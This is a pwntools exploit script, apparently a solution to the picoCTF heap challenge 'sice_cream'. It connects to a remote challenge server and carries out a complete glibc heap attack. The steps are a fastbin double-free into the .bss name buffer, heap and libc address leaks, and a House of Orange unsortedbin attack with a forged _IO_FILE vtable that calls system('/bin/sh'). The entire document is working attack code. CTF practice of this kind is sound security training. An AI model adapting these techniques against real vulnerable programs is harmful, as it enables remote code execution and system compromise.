# This is a real hard one
from pwn import *

libc = ELF("./libc.so.6")

def alloc(size,data):
    p.recvuntil(b"Exit\n>")
    p.sendline(b"1")
    p.sendlineafter(b">",str(size).encode())
    p.sendafter(b">",data + b"X" * (size - len(data)))

def free(idx):
    p.recvuntil(b"Exit\n>")
    p.sendline(b"2")
    p.sendlineafter(b">",str(idx).encode())

def rename(new_name):
    p.recvuntil(b"Exit\n>")
    p.sendline(b"3")
    p.sendafter(b">",new_name)

p = remote("fickle-tempest.picoctf.net",63708)
#p = process("./sice_cream")
p.sendline(b"name")

# start alloc
alloc(0x58,b"")
alloc(0x58,b"")

# leak heap address
rename(b"A"*256)
hleak = p.recvline().strip()[299:-1]
heap_base = u64((b"\x00" + hleak).ljust(8,b"\x00"))
p.info(f"Heap Base: {hex(heap_base)}")

# alloc a fastbin chunk in the global name variable
free(0)
free(1)
free(0)
alloc(0x58,p64(0x602040)) # name address in .bss
alloc(0x58,b"")
alloc(0x58,b"")
rename(p64(0) + p64(0x60) + p64(0) * 2) # fake fastbin chunk
alloc(0x58,b"") # 5 ('name' chunk)
alloc(0x58,b"") # 6
fake_big_chunk = p64(0) + p64(0xc1) + b"\x00" * (0xc0 - 0x10)
fake_fastbin_chunk_2 = p64(0xc0) + p64(0x21)
rename(fake_big_chunk + fake_fastbin_chunk_2)
free(5) # get it into the unsortedbin

# leak libc address
rename(b"A"*16)
leak = p.recvline().strip()[58:-1]
main_arena_leak = u64((leak).ljust(8,b"\x00"))
libc.address = main_arena_leak - 0x3c4b78
p.info(f"LIBC Base: {hex(libc.address)}")

# House of Orange
system = libc.sym['system']
_IO_list_all = libc.sym['_IO_list_all']
fake_vtable = heap_base + 0xd0
# fake free chunk
payload = b"/bin/sh\x00" + p64(0x61) + p64(0) +  p64(_IO_list_all - 0x10) 
# fake _IO_FILE 
payload += p64(2) + p64(3) + p64(0) * 18
# fake _IO_FILE_plus
payload += p64(0) * 3  + p64(fake_vtable)
# unsortedbin attack
rename(payload)
free(6) # avoid the 'fake vtable' chunk to be given from the unsortedbin
# fake vtable
alloc(0x50,p64(system)*7)
# call abort()
p.recvuntil(b"Exit\n>")
p.sendline(b"1")
p.sendlineafter(b">",b"16")

sleep(0.5)
p.interactive()
